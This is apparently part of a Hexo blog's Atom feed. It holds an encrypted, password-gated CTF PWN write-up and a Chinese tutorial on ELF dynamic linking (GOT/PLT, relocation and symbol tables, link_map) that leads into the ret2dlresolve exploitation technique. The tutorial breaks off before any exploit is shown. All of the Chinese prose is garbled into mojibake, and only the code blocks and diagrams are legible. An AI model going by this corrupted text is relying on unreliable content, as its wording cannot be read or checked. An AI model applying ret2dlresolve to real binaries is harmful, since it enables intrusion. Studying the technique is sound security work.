76175089ec4b11f5d7b597ea7d857f0253813ff488db5cbf97f2fcbc41c1eff5c7f6b09395ba07eccc17f7e598f9e1f6c56fd756e929850b4fc6d2e01f3bed7008eb77835ccbfe35fff3cdc0335fd2858da33b77265c3b9ec1de4aec5963806c50fc8d02262f430cf6b6d93483a0ff3cea3160cd4e8cb268c60df374c49186f27177bfe799288d5d4cefc3b653aeebd42ce2a498a084dcd24d220b6bb19c0ec83527d0b9b14cc490bb1c9ac4114a4b2814caea836b683b5b14229c4cfd00ef6e5c644a7b671cc82212ad396381e39477a74da6ccfdc125997f2e556b24124b20b18eef487157d52564fa6e70953322c88e78d7b7db50f8abeb5471f7f3b8d2fed86d5901eb438217835432cf42db548bb22a64b043e43c5b4c6ad4486841475b84068fd9b8f6b6c470b0846c00a8675c6d532448d64d1339f5880e1e504c0ae2f84bcad84a90f55322041a75ca4c4c04bc2e77570274fb8ef726b15591d859a313a8cf8f44224679c6fb83107a9954c53d7609f58964655753245ceb485adc7f8be259a672e22b84320ed146afe8f2d090e2c80f00c58535932ea34d2fdfb264730f8d0028ae0682f4de89064d2cc67db02e0e3c8e6f6eb18cd22180f7f83cb1aca6f1ae58aee90d9a1f53ac10197c09d9000698213944a6f4304670424898fb62a1524e7f7984dbad4d85d6ddf03fbd1b5dbc490b9d1e4cc1be4f4417e913330b8fbce59e44c7a9084f0a5e56cf5f8bf8f9e07e8d49fa945cd50fa76ce30e7e82937add4aff35bf5e4971baef7d4cb2cae06cdf7dc4d7f8239b3dc05a0d50ce56318bad62112da4c11c7cabf8629f5006dd3504d2b284fcfc9f9c7e11ed51d3bcb77390b19159c5ad0419503824dc89b46aad82374a4fd35ed2c767ccfe2f661af97b9aefb89b83fb96ee9e5ca5aee1e2d9e8cfda34f1b487b69f8fc07a6ef8518669755cecd86e81924ec432be58f3b52db6c7ec02938abe6b4287d430a505837ab65c90d9cf291ca0e0638d9f9238ca1d1d5151c04ac5f87b7ec9fc634f03c55f64395842ccc531a2ddc527d5f41348635b85081e042b3fb113ee0e0036c74bed7ffdd5018b787b069b8b4a3b412223203b57a1a92b2221dbaede6d835ef5d6d5da30f7afeff609c86f7808bd60b7498fbe35f188193934307aad23db121ccf86419eff44c2e354f10052f5d424a1a77d185063ed40e4d3152b4570001e09fa0e1e7d145fc3cc9682262fd6740986af1ee0da10649d7cde5f0c00503bf42fd07ca97257bd99a21ae55be8b0b14ea591190b64bba42558c6aa40ad405e9d5e4e8323614c479e2ed58a1a7661bd8cf5776e4e0039f00e78527b5d26a132bcaf7d50563365e726ad78465c1d8e225631afee8730e163fe80564ec6d2391c403ecc6ad1a85f8f9f7d5833fd0de5611949086d05274043c21a840dd5ecb98cd6b82909982ab99e51376600817723714d3acce45c267b61ac0bc673e32e4ef34d30e159fa895592cd45c0811167224fbbd60e4df78c70f52ab17589f9b0ff113836cd13803dbc9f697394ed22c374dd8970028c5022323083406cd48b66f793c8a0be7aa9d8729cfed3fb04fba889cb776b903a8c0663f30f94f1d3088aad1a35278d80764bf48245f16bfcafaca5227aab9f9bf0bf8591276add3512716ef3f46dec80bc037395c48054437e0760c5312d5316f522a760303a095ea31348e67bdc21901425bf1aa0fea120e2a0191bf79541dc9e078d1d44f5879c25f5f401057a791e044a107cb4193d5ec4fd1afafda86cae65b82e486c672fe499f0a664ef262c3ba801fc8837c975e4e7d2869c1b4061fe3067cf62904760757eca4bae843313df08a4b04b9855f969b15d1cdf94ba42c87a8aab91eeff8d20d5fe0276c294eff2d20627375fdf3ffba8eb2c6f3fda107f9b81c85508fcae0fa99a8151e9717bf7e0a39cdb2a01c1fde14a6a7b95794378cbdaf8048fee4d58932fffac71c782c35f3e3dd21ff9e11e6f90f9c2633a7e572b5c76677b64e93d487a0d946d8f28eab44e993e1e9ed0a580de51d06ae1c0aed2ca443e08c480319a3ba35a117f09706e0af8aca1a196c88696c585aa2bb6d0906820b07c39821922a8f0ab42e2836dad82afe01a28cdaecd4752d9a002e738fbec23bff04239dcaa33f6794be38ae8b00fa884976c40f2e20dd40128eec86a79c1a2b4c839ef9549f584f0d40c8dec43ed058469cbf693f4d18f17829dfd80ab4060d8533b498d41c996023f154e170648353973767ff7cf199647d3c66618a2e77a72212cca58d1de624f78fac2a47e15aef777ba325cd2d373e56d53b01feed4906f9e2e5123f3af0108e3a118d650309a57e656f3b40acaec6bcaa066862b986c0972f0d2f5dabf4a578e329b50a7da8a3244b0f8c4564534cd0648121a41de23a396b71792af6e0cf59cbfaac9079a31d4bc0b19d15dcecabc02646b4378db17191222414a326077b7b3f14cd2a04a45e4a8f9a4fd1ce86b3095c5cb8886b8bc8ba8e9d4da1313be658b23ef045db9cba4bd2546730a83202f40ed04070c74075bc6d11c3753273fc9acd9746869a2bb136b3b4857f0a8500ddef92f47dc89a1717c49410a1b934b8b645992c16b23468bf009d825a5e5e704a5056da3b21adeecaeefae0114ac2cff923cf7606fee4133e1d46615b712485c9d7df17618d6fd8d3c9ebd10e2c6052979e82041de2eaaab8584c40d3f60cb9f562a50cd8e78ee9f62f7a2ceb23ebf6509a085267379e8184d7b4f76507368d49ddc2415fc72b20ad603911c3ac11dd74f6ac8529d2f025dadf7fb1bc9f92967d670a9a822e0d4ca13e7ba084b2b0693521c367d9c123e926108cf7f8b53477f4dc183f4d9c1a8d049c96b8dd3fb46f4f455b9c4d3175a3fa2c6263f4fff6d29b6378cbaee3304303a1c49a71db8668f1077738b3f3f05a3af10b21eb7c1bca6e961ae7e5f960d7ee347e1c1fd5a2fa7d415ac97cd1e39c21e6a6474fbc3550a4a514ef6b1ef8ec0a7c465a0f22c4f3aed82b08fb44dd2a8afa4662482d4552a997043475fad5b7e958e749fdea04013ded5d3261acba2ee73d1cd13475cc4e7aae3e2b48ec635d4590782b8e221e32767bb2274e8231d2e059a9c9a834226c8e549af936928e9a272f62ec0f1bc90a7f3b5e0d12f1a0462d74c0a080ae079b7716b22b5d1abe6040271b84f997c663ffa8e172ec7ee604c0ed34b10151b006dc91622f5ebc09fb2e092d64151d22c731a0ca76e6a4045e82fea7c898176ede2e1f774c753e1524b2c315356cdd675f72ff5885154ed96c8f7bcfaa5f819034c4a34ce409750282075c0f8af5599b93c8b2a5f950d3d1e97934c9934ad9b75fdc6042cbbe9a23dce944b8ad2d7b88273cb309807fc3beffb06620583d50524656cf2c7bc5d384b8b1631870a6f372523643155b42276091398862ea62470429ec68821e510743cc10b2057af0c6081bdfcf1ef2dce67d698cdb092b114949bdb2fe993d7388ee58ad3eb15508faac46c0d9132f5c5753220fc83b332ac877f8f73777ca3a210de50e3f2e6370abf10b008620b3c7a9e397ed1a1ae5c80092f567322abd1df59487eadb1dbc0c381816e4933c586f3789472dfd4b8e1d5d8ecf44b8fa56153e51e823c175a8918a24b1c6ae11a10ea8befc3eed0c48fc1712a868544fced7b8ead825a5304bf42c8b5732f8ebbd111aca4b83437282d972152602e4f4931178c5c6db90cac54a1593669358cc6d957fdca0e13075847694cd96c66247d5f5a357e34ef1c500a6f276c452a37683bd56cf779aad0781ab88e698d71b6b903ae4f989462b77f00daa85e828ac86233b84f97c7a4fe2ac0d976a31ba8ba4ff7312b3e197daeb10e44fb50dbb44c5d12c8a2ed5b1bc634aaaadf705eb671c0d50cc27bc6f76781ba96da945154efa5c55328e1c2e0b74203fbe634550e2591036ae732706afcf6bb6ec900d4ac9be5d40acfd13410e400f6847ee2f720abcf42b91fe23b834c4b07e59c0ecf5181c6284b36a782ddb8c26b914ce6e5ebb13087232ef8153214c17f57b0a57a2d419c421f264386650676aedd47ead588223f6e1a11c820c8fd32ee3a3d1050d09f80ada3e733cd01898bdea589704476315b95ac6c0020a7836a5bf49bf4554a95ecadbde90fffef380d0265eb8750ae3a0696d576c2a02bc4063b170aaced7eb0d3b99597d25efb2a9c5af859b314988546eac6850de66d382a1b57e527a4d2001760917bf138c25d9bf08</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Áî±‰∫éÁõ∏ÂÖ≥Ê≥ïÂæãÊ≥ïËßÑÔºåËØ•wpÊöÇ‰∏çÂºÄÊîæ</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">passwd</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>dlÁõ∏ÂÖ≥ÊîªÂáªÊ±áÊÄª</title>
    <link href="http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"/>
    <id>http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/</id>
    <published>2024-03-05T13:27:55.000Z</published>
    <updated>2024-03-05T13:30:02.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Âä®ÊÄÅÈìæÊé•"><a href="#Âä®ÊÄÅÈìæÊé•" class="headerlink" title="Âä®ÊÄÅÈìæÊé•"></a>Âä®ÊÄÅÈìæÊé•</h1><h2 id="Êú∫Âà∂"><a href="#Êú∫Âà∂" class="headerlink" title="Êú∫Âà∂"></a>Êú∫Âà∂</h2><p>‰ΩøÁî®Âä®ÊÄÅÈìæÊé•Êó∂ÔºåÁ®ãÂ∫èÊåâÊ®°ÂùóÊãÜÂàÜ‰∏∫Â§ö‰∏™Áã¨Á´ãÈÉ®ÂàÜÔºåÂú®Á®ãÂ∫èËøêË°åÊó∂ÊâçÈìæÊé•Âú®‰∏ÄËµ∑„ÄÇlinux‰∏≠ELFÂä®ÊÄÅÈìæÊé•Êñá‰ª∂Áß∞‰∏∫Âä®ÊÄÅÂÖ±‰∫´ÂØπË±°(DSO)Ôºå‰ª•<code>.so</code>‰∏∫ÊãìÂ±ïÂêç„ÄÇÂ∏∏Áî®ÁöÑCËØ≠Ë®ÄËøêË°åÂ∫ìglibc‰øùÂ≠ò‰∏∫<code>libc.so</code>„ÄÇ</p><p>ÈìæÊé•ÁöÑÊìç‰ΩúÁî±Âä®ÊÄÅÈìæÊé•Âô®ldÂÆåÊàê„ÄÇËøêË°åÊó∂Âä®ÊÄÅÈìæÊé•Âô®‰∏éÊôÆÈÄöÂÖ±‰∫´ÂØπË±°‰∏ÄÂêåË¢´Êò†Â∞ÑÂà∞ËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥ÔºåÁ®ãÂ∫èÂú®ËøêË°åÊó∂È¶ñÂÖàËøêË°åldÔºåÂÆåÊàêÊâÄÊúâÂä®ÊÄÅÈìæÊé•Â∑•‰ΩúÂêéÂÜçËΩ¨‰∫§‰∏ªÁ®ãÂ∫è„ÄÇ</p><p>Â¶ÇÊûúÁ®ãÂ∫è‰∏≠Â≠òÂú®Ë∑®Ê®°ÂùóÁöÑÊï∞ÊçÆËÆøÈóÆÔºåÁî±‰∫éÁõÆÊ†áÂèòÈáèÁöÑÂú∞ÂùÄË¶ÅÂú®Ë£ÖËΩΩÊó∂ÊâçËÉΩÁ°ÆÂÆöÔºåÈúÄË¶Å‰ΩøÂæóÁ®ãÂ∫è‰∏≠ÁöÑ‰ª£Á†ÅÂú∞ÂùÄÊó†ÂÖ≥„ÄÇ‰∫éÊòØÊääË∑üÂú∞ÂùÄÁõ∏ÂÖ≥ÁöÑ‰ª£Á†ÅÊîæÂú®Êï∞ÊçÆÊÆµÈáåÔºåÂç≥ÂÖ®Â±ÄÂÅèÁßªË°®(Global Offset Table)„ÄÇËá≥‰∫éÊ®°ÂùóÈó¥ÁöÑË∞ÉÁî®ÔºåË∑≥ËΩ¨Ôºå‰πüÁî®GOTË°®ÂÆûÁé∞Ôºå‰ΩÜÊòØÂá∫‰∫éÊïàÁéáËÄÉËôëÔºåÈúÄË¶ÅÂºïÂÖ•Âª∂ËøüÁªëÂÆöÊú∫Âà∂„ÄÇ</p><p>Âª∂ËøüÁªëÂÆö(Lazy Binding)ÁöÑÊÄùÊÉ≥ÊòØÂú®Á®ãÂ∫èÁ¨¨‰∏ÄÊ¨°Áî®Âà∞Êó∂ÊâçÁªëÂÆö(Á¨¶Âè∑Êü•ÊâæÔºåÈáçÂÆö‰Ωç)Ôºå‰ΩøÁî®PLTË°®(Procedure Linkage Table)ÂÆûÁé∞ÔºåÂÆûÁé∞‰ª£Á†ÅÂ¶Ç‰∏ã:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLT0:</span><br><span class="line">push *(GOT + 4)</span><br><span class="line">jump *(GOT + 8)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">jump PLT0</span><br></pre></td></tr></table></figure><p>(Ê≠§Â§ÑÁöÑÂÆûÁé∞‰∏é‰πãÂêéÁöÑÂà©Áî®ÂØÜÂàáÁõ∏ÂÖ≥)</p><p>ÂÖ∂‰∏≠<code>bar@GOT</code>‰∏≠ÂàùÂßã‰øùÂ≠ò<code>bar@plt</code>ÁöÑ‰∏ã‰∏ÄÊù°Êåá‰ª§(ÂéüÂú∞tp)ÔºåÈöèÂêépushÁöÑnÊòØbarÂú®ÈáçÂÆö‰ΩçË°®È°π‰∏≠ÁöÑÂ∫èÂè∑„ÄÇ<code>GOT + 4</code> ‰∏≠‰øùÂ≠ò‰∏Ä‰∏™Âêç‰∏∫<code>link_map</code>ÁöÑÁªìÊûÑ‰ΩìÁöÑÂú∞ÂùÄÔºåÂÆÉ‰øùÂ≠ò‰∫ÜÊú¨Ê®°ÂùóÂä®ÊÄÅÈìæÊé•ÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØÔºå<code>GOT + 8</code>‰∏≠‰øùÂ≠ò<code>_dl_runtime_resolve()</code>ÁöÑÂú∞ÂùÄÔºåËØ•ÂáΩÊï∞ÁöÑ‰ΩúÁî®‰æøÊòØËß£Êûê<code>link_map</code>ÔºåËÆ°ÁÆóÂá∫barÂáΩÊï∞ÁöÑÁúüÊ≠£Âú∞ÂùÄÔºåÂπ∂Â∞ÜÂÖ∂Â°´ÂÖ•<code>bar@GOT</code>‰∏≠</p><h2 id="ÂÆûÁé∞ÁªìÊûÑ"><a href="#ÂÆûÁé∞ÁªìÊûÑ" class="headerlink" title="ÂÆûÁé∞ÁªìÊûÑ"></a>ÂÆûÁé∞ÁªìÊûÑ</h2><h3 id="interpÊÆµ"><a href="#interpÊÆµ" class="headerlink" title=".interpÊÆµ"></a><code>.interp</code>ÊÆµ</h3><p>‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂä®ÊÄÅËøûÊé•Âô®ÁöÑË∑ØÂæÑ</p><h3 id="dynamicÊÆµ"><a href="#dynamicÊÆµ" class="headerlink" title=".dynamicÊÆµ"></a><code>.dynamic</code>ÊÆµ</h3><p><code>readelf -d Lib.so</code>Êü•Áúã<br>‰øùÂ≠ò‰∫ÜÂä®ÊÄÅËøûÊé•Âô®ÊâÄÈúÄÁöÑÂü∫Êú¨‰ø°ÊÅØÔºåÁªìÊûÑÂ¶Ç‰∏ã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   Elf32_Sword   d_tag;          <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">   <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">       Elf32_Word d_val;         <span class="comment">/* Integer value */</span></span><br><span class="line">       Elf32_Addr d_ptr;         <span class="comment">/* Address value */</span></span><br><span class="line">     &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword d_tag; <span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">Elf64_Xword d_val; <span class="comment">/* Integer value */</span></span><br><span class="line">Elf64_Addr d_ptr; <span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>Âú®<code>elf.h</code>‰∏≠ÂÆö‰πâ‰∫Ü‰∏çÂêåd_tagÁöÑÂÄº‰∏éÂØπÂ∫îÁ±ªÂûãÔºåÂêéÈù¢ÊØîËæÉÂ∏∏Áî®ÁöÑÊúâ</p><ul><li><code>DT_REL</code> Âä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®Âú∞ÂùÄ</li><li><code>DT_SYMTAB</code> Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®Âú∞ÂùÄ</li><li><code>DT_STRTAB</code> Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®Âú∞ÂùÄ</li><li><code>DT_INIT</code> ÂàùÂßãÂåñ‰ª£Á†ÅÂú∞ÂùÄ</li><li><code>DT_FINI</code> ÁªìÊùü‰ª£Á†ÅÂú∞ÂùÄ</li></ul><h3 id="DT-RELÂä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®"><a href="#DT-RELÂä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®" class="headerlink" title="DT_RELÂä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®"></a><code>DT_REL</code>Âä®ÊÄÅÈìæÊé•ÈáçÂÆö‰ΩçË°®</h3><p><code>readelf -r Lib.so</code>Êü•Áúã<br>ÂÖ±‰∫´ÂØπË±°ÁöÑÈáçÂÆö‰ΩçÂú®Ë£ÖËΩΩÊó∂ÂÆåÊàêÔºåÈáçÂÆö‰ΩçË°®ÂàÜ‰∏∫<code>.rel.dyn</code>Âíå<code>.rel.plt</code>„ÄÇÂâçËÄÖ‰øÆÊ≠£Êï∞ÊçÆÂºïÁî®ÔºåÂç≥<code>.got</code>Âíå<code>.data</code>ÔºõÂêéËÄÖ‰øÆÊ≠£<code>.got.plt</code>„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">Elf32_Word r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">Elf64_Xword r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_TYPE(val) ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_INFO(sym, type) (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p><code>r_offset</code>Ë°®Á§∫ÈúÄË¶Å‰øÆÊ≠£ÁöÑÂú∞ÂùÄÔºå<code>r_info</code>È´ò‰ΩçË°®Á§∫ËØ•Á¨¶Âè∑Âú®Á¨¶Âè∑Ë°®‰∏≠ÁöÑÂ∫èÂè∑Ôºå‰Ωé‰ΩçË°®Á§∫Á¨¶Âè∑Á±ªÂûã„ÄÇ</p><h3 id="DT-SYMTAB-Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®"><a href="#DT-SYMTAB-Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®" class="headerlink" title="DT_SYMTAB Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®"></a><code>DT_SYMTAB</code> Âä®ÊÄÅÈìæÊé•Á¨¶Âè∑Ë°®</h3><p><code>readelf -sD Lib.so</code>Êü•Áúã<br>ÈÄöÂ∏∏‰øùÂ≠òÂú®ÊÆµ<code>.dynsym</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">Elf32_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">Elf32_Word st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf32_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf64_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">Elf64_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">Elf64_Xword st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the st_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure><h3 id="DT-STRTAB-Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®"><a href="#DT-STRTAB-Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®" class="headerlink" title="DT_STRTAB Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®"></a><code>DT_STRTAB</code> Âä®ÊÄÅÈìæÊé•Â≠óÁ¨¶‰∏≤Ë°®</h3><p><code>.dynstr</code>‰∏≠<br>Â≠òÂÇ®Â≠óÁ¨¶‰∏≤ÔºåÊó†ÈúÄËµòËø∞</p><h3 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h3><p>‰∏Ä‰∏™ÁªìÊûÑ‰ΩìÔºå‰øùÂ≠òÂä®ÊÄÅÈìæÊé•Áõ∏ÂÖ≥‰ø°ÊÅØ<br>‰ª£Á†ÅÂ§™Èïø‰∏çË¥¥ÔºåÊúâ‰∏§‰∏™ÊØîËæÉÈáçË¶ÅÁöÑÈÉ®ÂàÜ</p><ul><li><code>l_addr</code> Á®ãÂ∫èÁöÑÂü∫ÂùÄ</li><li><code>l_info[]</code>‰∏Ä‰∏™Êï∞ÁªÑÔºå‰øùÂ≠ò‰∫ÜÂ§ö‰∏™ÈáçÂÆö‰ΩçÈ°πÁöÑÂú∞ÂùÄ</li></ul><h3 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h3><p>Ë∞ÉÁî®<code>_dl_runtime_resolve</code>Êó∂Ôºå‰º†ÂèÇ<code>link_map</code>Âíå<code>rel_offset</code>ÔºåÊü•ÊâæÊµÅÁ®ãÂ¶Ç‰∏ã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset)</span><br><span class="line">                                       +</span><br><span class="line">          +-----------+                |</span><br><span class="line">          | Elf32_Rel | &lt;--------------+</span><br><span class="line">          +-----------+</span><br><span class="line">     +--+ | r_offset  |        +-----------+</span><br><span class="line">     |    |  r_info   | +----&gt; | Elf32_Sym |</span><br><span class="line">     |    +-----------+        +-----------+      +----------+</span><br><span class="line">     |      .rel.plt           |  st_name  | +--&gt; | system\<span class="number">0</span> |</span><br><span class="line">     |                         |           |      +----------+</span><br><span class="line">     v                         +-----------+        .dynstr</span><br><span class="line">+----+-----+                      .dynsym</span><br><span class="line">| &lt;system&gt; |</span><br><span class="line">+----------+</span><br><span class="line">  .got.plt</span><br></pre></td></tr></table></figure><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h2><p>Ë∞ÉÁî®<code>_dl_runtime_resolve</code>ÂêéÔºåÂÆûÈôÖÂÆåÊàêÁªëÂÆöÂ∑•‰ΩúÁöÑÊòØÂÖ∂‰∏≠Ë∞ÉÁî®ÁöÑ<code>_dl_fixup</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 